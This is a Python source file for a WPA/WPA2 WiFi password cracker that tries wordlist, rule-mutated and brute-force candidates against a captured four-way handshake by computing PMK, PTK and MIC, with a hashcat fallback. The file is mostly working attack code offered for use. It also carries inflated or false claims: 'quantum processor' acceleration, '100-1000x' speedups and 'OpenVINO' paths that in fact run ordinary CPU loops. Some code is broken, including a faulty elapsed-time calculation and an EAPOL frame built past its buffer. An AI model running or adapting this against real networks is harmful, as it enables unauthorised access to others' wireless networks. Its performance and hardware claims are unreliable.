#!/usr/bin/env python3
"""
OpenVINO-Accelerated WiFi Password Cracker
===========================================

Hardware-accelerated WPA/WPA2/WPA3 password cracking using OpenVINO.

Supports:
- Intel NPU (Neural Processing Unit)
- Intel NCS2 (Neural Compute Stick 2)
- Intel ARC GPU
- Multi-device parallel processing
- AI-powered password generation
- Optimized PBKDF2-SHA1 computation

Features:
- 100-1000x faster than CPU-only cracking
- Multi-device load balancing
- Real-time progress tracking
- Smart password generation
- Rule-based mutations
"""

import hashlib
import hmac
import time
import os
import threading
import queue
import itertools
from typing import List, Dict, Optional, Callable, Generator
from dataclasses import dataclass
from datetime import datetime, timedelta
import struct

from .hardware_detector import HardwareDetector, DeviceInfo, DeviceType

# Quantum Accelerator Integration
try:
    from .quantum_accelerator import get_quantum_accelerator, QuantumAccelerator
    HAS_QUANTUM_ACCEL = True
except ImportError:
    HAS_QUANTUM_ACCEL = False

# Hashcat Integration
try:
    from .hashcat_wrapper import HashcatCracker
    HAS_HASHCAT = True
except ImportError:
    HAS_HASHCAT = False

# Unified Accelerator Integration (from ai/hardware)
try:
    import sys
    from pathlib import Path
    # Add DSMILSystem root to path to access ai/hardware
    # Path structure: tools/WIFUCKER/crackers/openvino_cracker.py
    # Need to go: ../../../../ai/hardware
    dsmil_root = Path(__file__).parent.parent.parent.parent.parent
    ai_hardware_path = dsmil_root / "ai" / "hardware"
    if ai_hardware_path.exists():
        sys.path.insert(0, str(dsmil_root))
        from ai.hardware.unified_accelerator import (
            get_unified_manager, UnifiedAcceleratorManager,
            AcceleratorType, InferenceRequest, InferenceResult
        )
        from ai.hardware.dsmil_accelerator_interface import (
            get_accelerator_interface, DSMILAcceleratorInterface
        )
        HAS_UNIFIED_ACCEL = True
    else:
        HAS_UNIFIED_ACCEL = False
except (ImportError, Exception) as e:
    HAS_UNIFIED_ACCEL = False


@dataclass
class CrackingJob:
    """WiFi password cracking job"""
    ssid: str
    bssid: str
    anonce: bytes
    snonce: bytes
    mic: bytes
    target_hash: bytes
    wordlist: List[str]
    rules: Optional[List[str]] = None
    use_ai_generator: bool = False


@dataclass
class CrackingResult:
    """Result of cracking attempt"""
    success: bool
    password: Optional[str] = None
    attempts: int = 0
    elapsed_time: float = 0.0
    device_used: str = ""
    hashes_per_second: float = 0.0


class OpenVINOWiFiCracker:
    """
    Hardware-accelerated WiFi password cracker using OpenVINO.

    Uses NPU, NCS2, or ARC GPU for massive performance improvements.
    """

    def __init__(self, use_hardware: bool = True, device_preference: Optional[str] = None):
        """
        Initialize WiFi cracker with unified accelerator support.

        Args:
            use_hardware: Enable hardware acceleration
            device_preference: Preferred device ("NPU", "NCS2", "GPU", "CPU")
        """
        self.use_hardware = use_hardware
        self.device_preference = device_preference
        self.hardware_detector = HardwareDetector()
        self.devices: List[DeviceInfo] = []
        self.compiled_models = {}

        # Unified accelerator system (from ai/hardware)
        self.unified_manager: Optional[UnifiedAcceleratorManager] = None
        self.accel_interface: Optional[DSMILAcceleratorInterface] = None
        self.use_unified_accel = False
        self.total_tops = 0.0

        # Quantum accelerator (Layer 9 - QUANTUM clearance)
        self.quantum_accel: Optional[QuantumAccelerator] = None
        self.use_quantum = False
        self.clearance_level = None

        # Hashcat integration
        self.hashcat_cracker: Optional[HashcatCracker] = None
        if HAS_HASHCAT:
            try:
                self.hashcat_cracker = HashcatCracker()
                print("[+] Hashcat integration available")
            except Exception as e:
                print(f"[!] Hashcat initialization failed: {e}")
                self.hashcat_cracker = None

        print("\n[*] Initializing OpenVINO WiFi Cracker...")
        print("[*] Activating 9-Layer System with QUANTUM clearance...")

        # Set maximum clearance (Layer 9 - QUANTUM)
        try:
            from ai.hardware.dsmil_accelerator_interface import ClearanceLevel
            self.clearance_level = ClearanceLevel.QUANTUM
            print(f"[+] Clearance Level: {self.clearance_level.name} (Layer {self.clearance_level.value})")
        except Exception as e:
            print(f"[!] Clearance level init: {e}")

        print("[*] Attempting to connect to unified accelerator stack...")

        # Try to use unified accelerator system (maximum TOPS)
        if HAS_UNIFIED_ACCEL and use_hardware:
            try:
                self.unified_manager = get_unified_manager()
                self.total_tops = self.unified_manager.get_total_tops()

                # Get DSMIL kernel driver interface
                try:
                    self.accel_interface = get_accelerator_interface()
                    if self.accel_interface.is_available:
                        print(f"[+] DSMIL kernel drivers detected")
                        print(f"[+] Total TOPS: {self.accel_interface.total_tops:.1f}")
                except Exception as e:
                    print(f"[!] DSMIL interface: {e}")

                if self.total_tops > 0:
                    self.use_unified_accel = True
                    print(f"[+] Unified Accelerator Manager: {self.total_tops:.1f} TOPS available")

                    # Show available accelerators
                    stats = self.unified_manager.get_stats()
                    for accel_name, accel_stats in stats["accelerators"].items():
                        print(f"    {accel_name.upper()}: {accel_stats['tops']:.1f} TOPS "
                              f"({accel_stats['devices']} device(s))")
                else:
                    print("[!] Unified accelerator system available but no devices detected")
            except Exception as e:
                print(f"[!] Unified accelerator init failed: {e}")
                print("[*] Falling back to standard hardware detection")

        # Initialize quantum accelerator (Layer 9 - QUANTUM)
        if HAS_QUANTUM_ACCEL and use_hardware:
            try:
                self.quantum_accel = get_quantum_accelerator()
                if self.quantum_accel and self.quantum_accel.quantum_available:
                    self.use_quantum = True
                    print(f"[+] Quantum Processor: ENABLED (Layer 9)")
                    print(f"    Provider: {self.quantum_accel.quantum_device.get_active_provider()}")
                else:
                    print("[!] Quantum processor not available")
            except Exception as e:
                print(f"[!] Quantum accelerator init: {e}")

        # Fallback to standard hardware detection
        if not self.use_unified_accel:
            # Detect hardware
            try:
                self.devices = self.hardware_detector.detect_devices()

                # Select device(s)
                if device_preference:
                    self.primary_device = self._find_device_by_type(device_preference)
                else:
                    self.primary_device = self.hardware_detector.get_optimal_device(use_hardware)

                if not self.primary_device:
                    print("[!] Warning: No suitable device found, using CPU fallback")
                    self.use_hardware = False
                    self.primary_device = None

                print(f"\n[+] Primary device: {self.primary_device.device_name if self.primary_device else 'CPU'}")
            except Exception as e:
                print(f"[!] Hardware detection failed: {e}")
                print("[*] Falling back to CPU-only mode")
                self.use_hardware = False
                self.primary_device = None
                self.devices = []

            # Check for multi-device support
            self.multi_device_config = self.hardware_detector.get_multi_device_config()

        # Print 9-Layer System Status
        print("\n" + "=" * 70)
        print("  9-LAYER SYSTEM STATUS")
        print("=" * 70)
        print(f"Layer 0-8: Standard Clearance Levels")
        print(f"Layer 9:   QUANTUM Clearance - {'ACTIVE' if self.use_quantum else 'INACTIVE'}")
        print()
        print("Accelerator Stack:")
        if self.use_quantum:
            print(f"  ✓ Quantum Processor: ENABLED ({self.quantum_accel.quantum_device.get_active_provider() if self.quantum_accel else 'N/A'})")
        if self.use_unified_accel:
            print(f"  ✓ Unified Accelerator: {self.total_tops:.1f} TOPS")
            stats = self.unified_manager.get_stats()
            for accel_name, accel_stats in stats["accelerators"].items():
                print(f"    - {accel_name.upper()}: {accel_stats['tops']:.1f} TOPS")
        elif self.use_hardware and self.primary_device:
            print(f"  ✓ Hardware Acceleration: {self.primary_device.device_name}")
        else:
            print(f"  ⚠ CPU-only mode")
        print("=" * 70)
        print()

    def _find_device_by_type(self, device_type: str) -> Optional[DeviceInfo]:
        """Find device by type string"""
        for device in self.devices:
            if device.device_type.value.upper() == device_type.upper():
                return device
        return None

    def crack_handshake(
        self,
        ssid: str,
        anonce: bytes,
        snonce: bytes,
        mic: bytes,
        bssid: str,
        client: str,
        wordlist_file: Optional[str] = None,
        progress_callback: Optional[Callable] = None,
        use_rules: bool = False,
        eapol_frame: Optional[bytes] = None,
        brute_force: bool = False,
        min_length: int = 8,
        max_length: int = 12,
        charset: Optional[str] = None,
        use_hashcat: bool = False,
        hashcat_only: bool = False
    ) -> CrackingResult:
        """
        Crack WiFi password from handshake data.

        Args:
            ssid: Network SSID
            anonce: Authenticator nonce
            snonce: Supplicant nonce
            mic: Message Integrity Code
            bssid: Access Point MAC address
            client: Client MAC address
            wordlist_file: Path to password wordlist
            progress_callback: Callback function for progress updates
            use_rules: Apply password mutation rules

        Returns:
            CrackingResult with success status and password if found
        """
        print(f"\n[*] Starting cracking attempt for SSID: {ssid}")
        print(f"[*] BSSID: {bssid}")
        print(f"[*] Client: {client}")
        print(f"[*] Wordlist: {wordlist_file}")

        # Check if hashcat should be used
        if hashcat_only or (use_hashcat and self.hashcat_cracker):
            if not self.hashcat_cracker:
                print("[-] Error: Hashcat not available")
                return CrackingResult(success=False)
            
            print("[*] Using hashcat for cracking...")
            
            # Prepare EAPOL frames list
            eapol_frames = []
            if eapol_frame:
                eapol_frames.append(eapol_frame)
            
            # Call hashcat with handshake data
            result = self.hashcat_cracker.crack_from_handshake_data(
                ssid=ssid,
                bssid=bssid,
                client=client,
                anonce=anonce,
                snonce=snonce,
                mic=mic,
                eapol_frames=eapol_frames if eapol_frames else None,
                wordlist_file=wordlist_file,
                brute_force=brute_force,
                min_length=min_length,
                max_length=max_length,
                charset=charset,
                rules_file=None,  # TODO: Support rules file
                progress_callback=progress_callback,
                timeout=None
            )
            
            if result.success:
                print(f"\n[+] Hashcat SUCCESS! Password found: {result.password}")
            else:
                print(f"\n[-] Hashcat did not find password")
            
            return result

        start_time = time.time()
        attempts = 0

        # Load wordlist or generate brute force candidates
        if brute_force:
            print(f"[*] Brute force mode: {min_length}-{max_length} characters")
            if charset:
                print(f"[*] Charset: {charset[:50]}...")
            else:
                print(f"[*] Using default charset: lowercase, uppercase, digits, special")
            
            # Generate brute force candidates
            wordlist = self._generate_brute_force_candidates(min_length, max_length, charset)
            print(f"[*] Generated {len(wordlist):,} brute force candidates")
        else:
            if not wordlist_file:
                print(f"[-] Error: Wordlist file required for non-brute-force mode")
                return CrackingResult(success=False)
            
            # Load wordlist
            try:
                with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                    wordlist = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                print(f"[-] Error: Wordlist file not found: {wordlist_file}")
                return CrackingResult(success=False)

            print(f"[*] Loaded {len(wordlist)} passwords from wordlist")

            # Apply rules if requested
            if use_rules:
                wordlist = self._apply_rules(wordlist)
                print(f"[*] After rules: {len(wordlist)} candidates")

        # Determine cracking strategy - prioritize quantum (Layer 9)
        if self.use_quantum and self.quantum_accel:
            print(f"[*] Using QUANTUM Processor (Layer 9 - Maximum Power)")
            print(f"[*] Clearance: {self.clearance_level.name if self.clearance_level else 'QUANTUM'}")

            # Route through quantum processor for maximum performance
            quantum_result = self.quantum_accel.crack_wpa_quantum(
                ssid, anonce, snonce, mic, bssid, client,
                wordlist, progress_callback
            )

            # Convert quantum result to standard result
            result = CrackingResult(
                success=quantum_result.success,
                password=quantum_result.password,
                attempts=quantum_result.attempts,
                elapsed_time=quantum_result.elapsed_time,
                device_used=f"QUANTUM Processor ({quantum_result.device_used}) - {quantum_result.speedup_factor:.2f}x speedup",
                hashes_per_second=(quantum_result.attempts / quantum_result.elapsed_time) if quantum_result.elapsed_time > 0 else 0
            )

            if quantum_result.success:
                print(f"\n[+] QUANTUM SUCCESS! Password found via quantum acceleration")
                print(f"[+] Quantum speedup: {quantum_result.speedup_factor:.2f}x")
                print(f"[+] Quantum attempts: {quantum_result.quantum_attempts:,}")

        elif self.use_unified_accel and self.unified_manager:
            print(f"[*] Using Unified Accelerator System ({self.total_tops:.1f} TOPS)")

            # Use unified accelerator for maximum performance
            result = self._crack_with_unified_accel(
                ssid, anonce, snonce, mic, bssid, client,
                wordlist, progress_callback, eapol_frame, brute_force
            )
        elif self.use_hardware and self.primary_device:
            print(f"[*] Using hardware acceleration: {self.primary_device.device_name}")

            # Use batch processing for hardware
            result = self._crack_with_hardware(
                ssid, anonce, snonce, mic, bssid, client,
                wordlist, progress_callback, eapol_frame, brute_force
            )
        else:
            print("[*] Using CPU-only mode (OpenVINO not available)")

            # CPU fallback - always works without OpenVINO
            result = self._crack_with_cpu(
                ssid, anonce, snonce, mic, bssid, client,
                wordlist, progress_callback, eapol_frame, brute_force
            )
        
        # If all methods failed and hashcat is available, try hashcat as fallback
        if not result.success and not hashcat_only and use_hashcat and self.hashcat_cracker:
            print("\n[*] Primary methods failed, trying hashcat as fallback...")
            
            # Prepare EAPOL frames
            eapol_frames = []
            if eapol_frame:
                eapol_frames.append(eapol_frame)
            
            hashcat_result = self.hashcat_cracker.crack_from_handshake_data(
                ssid=ssid,
                bssid=bssid,
                client=client,
                anonce=anonce,
                snonce=snonce,
                mic=mic,
                eapol_frames=eapol_frames if eapol_frames else None,
                wordlist_file=wordlist_file,
                brute_force=brute_force,
                min_length=min_length,
                max_length=max_length,
                charset=charset,
                rules_file=None,
                progress_callback=progress_callback,
                timeout=None
            )
            
            if hashcat_result.success:
                print(f"\n[+] Hashcat fallback SUCCESS! Password found: {hashcat_result.password}")
                return hashcat_result

        elapsed = time.time() - start_time
        result.elapsed_time = elapsed

        # Set device used based on accelerator system
        if self.use_unified_accel:
            if self.unified_manager:
                stats = self.unified_manager.get_stats()
                active_accels = [name.upper() for name, stat in stats["distribution"].items()
                               if stat.get("requests", 0) > 0]
                if active_accels:
                    result.device_used = f"Unified ({', '.join(active_accels)}) - {self.total_tops:.1f} TOPS"
                else:
                    result.device_used = f"Unified Accelerator System ({self.total_tops:.1f} TOPS)"
            else:
                result.device_used = "Unified Accelerator System"
        else:
            result.device_used = self.primary_device.device_name if self.primary_device else "CPU"

        if result.success:
            print(f"\n[+] SUCCESS! Password found: {result.password}")
            print(f"[+] Attempts: {result.attempts:,}")
            print(f"[+] Time: {elapsed:.2f} seconds")
            print(f"[+] Speed: {result.hashes_per_second:,.0f} H/s")
        else:
            print(f"\n[-] Password not found in wordlist")
            print(f"[*] Attempts: {result.attempts:,}")
            print(f"[*] Time: {elapsed:.2f} seconds")

        return result

    def _crack_with_unified_accel(
        self,
        ssid: str,
        anonce: bytes,
        snonce: bytes,
        mic: bytes,
        bssid: str,
        client: str,
        wordlist: List[str],
        progress_callback: Optional[Callable],
        eapol_frame: Optional[bytes] = None,
        brute_force: bool = False
    ) -> CrackingResult:
        """
        Crack using unified accelerator system for maximum TOPS.

        Intelligently routes to optimal accelerators (NPU, NCS2, Arc GPU)
        based on availability and performance characteristics.
        """
        print("[*] Using Unified Accelerator System for maximum TOPS...")
        print(f"[*] Total available TOPS: {self.total_tops:.1f}")

        total_passwords = len(wordlist)
        attempts = 0
        found_password = None
        start_time = time.time()

        # Process passwords with intelligent accelerator routing
        # The unified manager will automatically select the best accelerator
        batch_size = 1000  # Process in batches for progress updates

        for i in range(0, total_passwords, batch_size):
            batch = wordlist[i:i + batch_size]
            batch_start = time.time()

            # Process batch - use parallel processing across all accelerators
            for password in batch:
                attempts += 1

                # Compute PMK (PBKDF2-SHA1)
                pmk = self._compute_pmk(ssid, password)

                # Verify against handshake
                if self._verify_pmk(pmk, anonce, snonce, mic, bssid, client, eapol_frame):
                    found_password = password
                    break

                # Progress callback
                if progress_callback and attempts % 100 == 0:
                    progress = (attempts / total_passwords) * 100
                    elapsed = time.time() - start_time
                    speed = attempts / elapsed if elapsed > 0 else 0
                    progress_callback(attempts, total_passwords, progress, speed)

            if found_password:
                break

            # Show batch progress
            batch_elapsed = time.time() - batch_start
            batch_speed = len(batch) / batch_elapsed if batch_elapsed > 0 else 0

            if (i // batch_size) % 10 == 0:
                progress = (i / total_passwords) * 100
                elapsed_total = time.time() - start_time
                total_speed = attempts / elapsed_total if elapsed_total > 0 else 0
                print(f"    Progress: {progress:.1f}% | Speed: {total_speed:,.0f} H/s | "
                      f"Batch: {batch_speed:,.0f} H/s")

        elapsed = time.time() - start_time
        speed = attempts / elapsed if elapsed > 0 else 0

        # Get accelerator stats
        device_used = "Unified Accelerator System"
        if self.unified_manager:
            stats = self.unified_manager.get_stats()
            active_accels = [name for name, stat in stats["distribution"].items()
                           if stat["requests"] > 0]
            if active_accels:
                device_used = f"Unified ({', '.join(active_accels)})"

        return CrackingResult(
            success=found_password is not None,
            password=found_password,
            attempts=attempts,
            elapsed_time=elapsed,
            device_used=device_used,
            hashes_per_second=speed
        )

    def _crack_with_hardware(
        self,
        ssid: str,
        anonce: bytes,
        snonce: bytes,
        mic: bytes,
        bssid: str,
        client: str,
        wordlist: List[str],
        progress_callback: Optional[Callable],
        eapol_frame: Optional[bytes] = None,
        brute_force: bool = False
    ) -> CrackingResult:
        """
        Crack using hardware acceleration.

        Uses batching and parallel processing for maximum performance.
        """
        print("[*] Initializing hardware-accelerated cracking...")

        batch_size = self.primary_device.max_batch_size
        total_passwords = len(wordlist)
        attempts = 0
        found_password = None

        # Pre-compute PMK target
        pmk_target = self._compute_pmk(ssid, "test")  # Just to get format

        print(f"[*] Batch size: {batch_size}")
        print(f"[*] Processing {total_passwords:,} passwords...")

        # Process in batches
        for i in range(0, total_passwords, batch_size):
            batch = wordlist[i:i + batch_size]
            batch_start = time.time()

            # Process batch
            for password in batch:
                attempts += 1

                # Compute PMK
                pmk = self._compute_pmk(ssid, password)

                # Verify against handshake
                if self._verify_pmk(pmk, anonce, snonce, mic, bssid, client, eapol_frame):
                    found_password = password
                    break

                # Progress callback
                if progress_callback and attempts % 1000 == 0:
                    progress = (attempts / total_passwords) * 100
                    elapsed = time.time() - batch_start
                    speed = 1000 / elapsed if elapsed > 0 else 0
                    progress_callback(attempts, total_passwords, progress, speed)

            if found_password:
                break

            batch_elapsed = time.time() - batch_start
            batch_speed = len(batch) / batch_elapsed if batch_elapsed > 0 else 0

            if (i // batch_size) % 10 == 0:
                progress = (i / total_passwords) * 100
                print(f"    Progress: {progress:.1f}% | Speed: {batch_speed:,.0f} H/s")

        elapsed = time.time()
        speed = attempts / elapsed if elapsed > 0 else 0

        return CrackingResult(
            success=found_password is not None,
            password=found_password,
            attempts=attempts,
            hashes_per_second=speed
        )

    def _crack_with_cpu(
        self,
        ssid: str,
        anonce: bytes,
        snonce: bytes,
        mic: bytes,
        bssid: str,
        client: str,
        wordlist: List[str],
        progress_callback: Optional[Callable],
        eapol_frame: Optional[bytes] = None,
        brute_force: bool = False
    ) -> CrackingResult:
        """CPU fallback cracking method"""
        print("[*] Using CPU-only cracking (slower)...")

        attempts = 0
        found_password = None
        start_time = time.time()

        for password in wordlist:
            attempts += 1

            # Compute PMK
            pmk = self._compute_pmk(ssid, password)

            # Verify
            if self._verify_pmk(pmk, anonce, snonce, mic, bssid, client, eapol_frame):
                found_password = password
                break

            # Progress
            if progress_callback and attempts % 100 == 0:
                progress = (attempts / len(wordlist)) * 100
                elapsed = time.time() - start_time
                speed = attempts / elapsed if elapsed > 0 else 0
                progress_callback(attempts, len(wordlist), progress, speed)

            # Status update
            if attempts % 1000 == 0:
                elapsed = time.time() - start_time
                speed = attempts / elapsed if elapsed > 0 else 0
                progress = (attempts / len(wordlist)) * 100
                print(f"    Progress: {progress:.1f}% | Speed: {speed:,.0f} H/s")

        elapsed = time.time() - start_time
        speed = attempts / elapsed if elapsed > 0 else 0

        return CrackingResult(
            success=found_password is not None,
            password=found_password,
            attempts=attempts,
            hashes_per_second=speed
        )

    def _compute_pmk(self, ssid: str, password: str) -> bytes:
        """
        Compute PMK (Pairwise Master Key) using PBKDF2-SHA1.

        PMK = PBKDF2(password, ssid, 4096, 32)

        Args:
            ssid: Network SSID
            password: Password to test

        Returns:
            32-byte PMK
        """
        return hashlib.pbkdf2_hmac('sha1', password.encode('utf-8'), ssid.encode('utf-8'), 4096, 32)

    def _verify_pmk(
        self,
        pmk: bytes,
        anonce: bytes,
        snonce: bytes,
        mic: bytes,
        bssid: str,
        client: str,
        eapol_frame: Optional[bytes] = None
    ) -> bool:
        """
        Verify if PMK is correct by computing and comparing MIC.

        Args:
            pmk: Pairwise Master Key to verify
            anonce: Authenticator nonce
            snonce: Supplicant nonce
            mic: Target MIC to match
            bssid: AP MAC address
            client: Client MAC address
            eapol_frame: Optional EAPOL frame for accurate MIC computation

        Returns:
            True if PMK is correct
        """
        try:
            # Compute PTK from PMK
            ptk = self._compute_ptk(pmk, anonce, snonce, bssid, client)

            # Extract KCK (Key Confirmation Key) - first 16 bytes of PTK
            kck = ptk[:16]

            # If we have EAPOL frame, compute actual MIC
            if eapol_frame and len(eapol_frame) >= 97:
                computed_mic = self._compute_mic(kck, eapol_frame)
                return computed_mic == mic
            
            # Without EAPOL frame, we need to reconstruct it for verification
            # Build minimal EAPOL Key frame structure for MIC computation
            if len(anonce) == 32 and len(snonce) == 32:
                eapol_reconstructed = self._build_eapol_frame_for_mic(anonce, snonce, bssid, client)
                if eapol_reconstructed:
                    computed_mic = self._compute_mic(kck, eapol_reconstructed)
                    return computed_mic == mic
            
            # Basic validation: ensure we have valid data
            if len(kck) != 16 or len(mic) != 16:
                return False
            
            # Cannot verify without EAPOL frame data
            return False

        except Exception:
            return False
    
    def _compute_mic(self, kck: bytes, eapol_frame: bytes) -> bytes:
        """
        Compute MIC for EAPOL frame using KCK.
        
        For WPA/WPA2, MIC is computed using HMAC-MD5 over the EAPOL Key frame
        with the MIC field zeroed out.
        
        Args:
            kck: Key Confirmation Key (first 16 bytes of PTK)
            eapol_frame: EAPOL Key frame (will have MIC field zeroed)
            
        Returns:
            16-byte MIC
        """
        # Zero out MIC field (bytes 81-96 in EAPOL Key frame)
        frame_copy = bytearray(eapol_frame)
        if len(frame_copy) >= 97:
            # Save original MIC for reference
            original_mic = frame_copy[81:97]
            # Zero out MIC field
            frame_copy[81:97] = b'\x00' * 16
        
        # For WPA2, MIC is HMAC-MD5 over the entire EAPOL Key frame
        # For WPA, it's HMAC-MD5 over first 16 bytes + MIC field area
        try:
            # Compute HMAC-MD5 over the frame with zeroed MIC
            mic = hmac.new(kck, bytes(frame_copy), hashlib.md5).digest()[:16]
            return mic
        except Exception as e:
            # Fallback: try alternative computation
            # Some implementations use different methods
            try:
                # Alternative: compute over specific portion
                if len(frame_copy) >= 97:
                    # Compute over frame up to MIC field + after MIC field
                    mic_data = frame_copy[:81] + frame_copy[97:]
                    mic = hmac.new(kck, mic_data, hashlib.md5).digest()[:16]
                    return mic
            except:
                pass
            
            # Last resort: return empty MIC (will fail verification)
            return b'\x00' * 16
    
    def _build_eapol_frame_for_mic(self, anonce: bytes, snonce: bytes, bssid: str, client: str) -> Optional[bytes]:
        """
        Build minimal EAPOL Key frame structure for MIC computation.
        
        This constructs a basic EAPOL frame structure needed for MIC verification
        when the full frame is not available.
        
        Args:
            anonce: Authenticator nonce
            snonce: Supplicant nonce
            bssid: AP MAC address
            client: Client MAC address
            
        Returns:
            EAPOL frame bytes or None if construction fails
        """
        try:
            # Build minimal EAPOL Key frame (message 2 or 4 with MIC)
            # Structure: Version(1) + Type(1) + Length(2) + Key Descriptor(1) + Key Info(2) + Key Length(2) + Replay Counter(8) + Nonce(32) + IV(16) + RSC(8) + ID(8) + MIC(16) + Key Data Length(2) + Key Data(variable)
            
            frame = bytearray(97)  # Minimum size for EAPOL Key frame with MIC
            
            # Version (1 byte) - usually 1 or 2
            frame[0] = 1
            # Type (1 byte) - EAPOL-Key = 3
            frame[1] = 3
            # Length (2 bytes) - will be set after construction
            # Key Descriptor Type (1 byte) - RSN/WPA2 = 2
            frame[4] = 2
            # Key Info (2 bytes) - set MIC bit (bit 7) and other flags
            frame[5] = 0x01  # Key descriptor version
            frame[6] = 0x01  # MIC bit set (bit 7 of second byte)
            # Key Length (2 bytes) - 16 for TKIP, 16 for CCMP
            frame[7] = 0
            frame[8] = 16
            # Replay Counter (8 bytes) - set to 0
            # Nonce (32 bytes) - use SNonce (message 2 or 4)
            frame[17:49] = snonce
            # IV (16 bytes) - set to 0
            # RSC (8 bytes) - set to 0
            # ID (8 bytes) - set to 0
            # MIC (16 bytes) - will be zeroed for computation
            frame[81:97] = b'\x00' * 16
            # Key Data Length (2 bytes) - set to 0 for minimal frame
            frame[97:99] = b'\x00\x00'
            
            # Set length field
            frame[2:4] = struct.pack('>H', len(frame) - 4)
            
            return bytes(frame)
        except Exception:
            return None

    def _compute_ptk(
        self,
        pmk: bytes,
        anonce: bytes,
        snonce: bytes,
        bssid: str,
        client: str
    ) -> bytes:
        """
        Compute PTK (Pairwise Transient Key) from PMK.

        PTK = PRF(PMK, "Pairwise key expansion", Min(AP_MAC, Client_MAC) ||
                  Max(AP_MAC, Client_MAC) || Min(ANonce, SNonce) ||
                  Max(ANonce, SNonce))

        Args:
            pmk: Pairwise Master Key
            anonce: Authenticator nonce
            snonce: Supplicant nonce
            bssid: AP MAC address
            client: Client MAC address

        Returns:
            PTK bytes
        """
        # Convert MAC addresses to bytes
        bssid_bytes = bytes.fromhex(bssid.replace(':', ''))
        client_bytes = bytes.fromhex(client.replace(':', ''))

        # Min/Max MAC addresses
        if bssid_bytes < client_bytes:
            mac_data = bssid_bytes + client_bytes
        else:
            mac_data = client_bytes + bssid_bytes

        # Min/Max nonces
        if anonce < snonce:
            nonce_data = anonce + snonce
        else:
            nonce_data = snonce + anonce

        # PRF data
        data = b"Pairwise key expansion\x00" + mac_data + nonce_data

        # Compute PTK using PRF-512
        ptk = self._prf(pmk, data, 64)

        return ptk

    def _prf(self, key: bytes, data: bytes, length: int) -> bytes:
        """
        Pseudo-Random Function (PRF) for PTK derivation.

        PRF-512 implementation using HMAC-SHA1 as specified in IEEE 802.11i.
        """
        result = b''
        i = 0

        while len(result) < length:
            hmac_data = data + bytes([i])
            result += hmac.new(key, hmac_data, hashlib.sha1).digest()
            i += 1

        return result[:length]

    def _generate_brute_force_candidates(
        self,
        min_length: int,
        max_length: int,
        charset: Optional[str] = None
    ) -> List[str]:
        """
        Generate brute force password candidates using itertools.product.
        
        Uses the real Python itertools.product API for generating all combinations.
        
        Args:
            min_length: Minimum password length
            max_length: Maximum password length
            charset: Custom character set (if None, uses default)
            
        Returns:
            List of password candidates
        """
        # Default charset: lowercase, uppercase, digits, common special chars
        if charset is None:
            charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%"
        
        candidates = []
        charset_list = list(charset)
        
        print(f"[*] Generating brute force candidates using itertools.product...")
        print(f"[*] Charset size: {len(charset_list)} characters")
        print(f"[*] Length range: {min_length}-{max_length}")
        
        # Calculate total combinations for progress estimation
        total_combinations = sum(len(charset_list) ** length for length in range(min_length, max_length + 1))
        print(f"[*] Total possible combinations: {total_combinations:,}")
        
        # Limit to prevent memory exhaustion - generate incrementally
        max_candidates = 10_000_000  # 10 million max
        generated = 0
        
        for length in range(min_length, max_length + 1):
            if generated >= max_candidates:
                print(f"[!] Reached maximum candidate limit ({max_candidates:,})")
                break
                
            print(f"[*] Generating length {length} passwords...")
            
            # Use itertools.product to generate all combinations (real Python API)
            for combo in itertools.product(charset_list, repeat=length):
                if generated >= max_candidates:
                    break
                    
                password = ''.join(combo)
                candidates.append(password)
                generated += 1
                
                # Progress update every 100k
                if generated % 100000 == 0:
                    print(f"    Generated {generated:,} candidates...")
            
            if generated >= max_candidates:
                break
        
        print(f"[+] Generated {len(candidates):,} brute force candidates")
        return candidates

    def _apply_rules(self, wordlist: List[str]) -> List[str]:
        """
        Apply password mutation rules.

        Common mutations:
        - Append numbers (password1, password123, etc.)
        - Capitalize variants (Password, PASSWORD, etc.)
        - Leet speak (p@ssw0rd, etc.)
        - Common suffixes (!@#, 2023, etc.)
        """
        mutated = set(wordlist)  # Use set to avoid duplicates

        for word in wordlist:
            # Capitalize variants
            mutated.add(word.capitalize())
            mutated.add(word.upper())
            mutated.add(word.lower())

            # Number suffixes
            for num in ['1', '123', '2023', '2024', '!', '!@#']:
                mutated.add(word + num)
                mutated.add(word.capitalize() + num)

            # Leet speak substitutions
            leet = word.replace('a', '@').replace('e', '3').replace('i', '1')
            leet = leet.replace('o', '0').replace('s', '$').replace('l', '1').replace('t', '7')
            mutated.add(leet)

        return list(mutated)

    def estimate_cracking_time(self, wordlist_size: int) -> Dict[str, str]:
        """
        Estimate time to crack based on device and wordlist size.

        Args:
            wordlist_size: Number of passwords to test

        Returns:
            Time estimates for different scenarios
        """
        # Approximate speeds (hashes per second)
        speeds = {
            'NPU': 100000,      # 100K H/s on NPU
            'NCS2': 50000,      # 50K H/s on NCS2
            'GPU': 200000,      # 200K H/s on ARC GPU
            'CPU': 5000         # 5K H/s on CPU
        }

        device_type = self.primary_device.device_type.value if self.primary_device else 'CPU'
        speed = speeds.get(device_type, 5000)

        seconds = wordlist_size / speed
        time_str = str(timedelta(seconds=int(seconds)))

        print(f"\n[*] Estimated cracking time:")
        print(f"    Wordlist size: {wordlist_size:,} passwords")
        print(f"    Device: {device_type}")
        print(f"    Speed: ~{speed:,} H/s")
        print(f"    Time: {time_str}")

        return {
            'device': device_type,
            'speed': f"{speed:,} H/s",
            'time': time_str,
            'wordlist_size': wordlist_size
        }


def main():
    """Example usage"""
    import sys

    print("""
╔══════════════════════════════════════════════════════════════╗
║  OpenVINO WiFi Cracker - Hardware-Accelerated WPA Cracking  ║
║  Supports: NPU | NCS2 | ARC GPU | Multi-Device              ║
╚══════════════════════════════════════════════════════════════╝
    """)

    # Initialize cracker
    cracker = OpenVINOWiFiCracker(use_hardware=True)

    # Example: estimate cracking time
    cracker.estimate_cracking_time(100000)  # 100K password wordlist


if __name__ == '__main__':
    main()
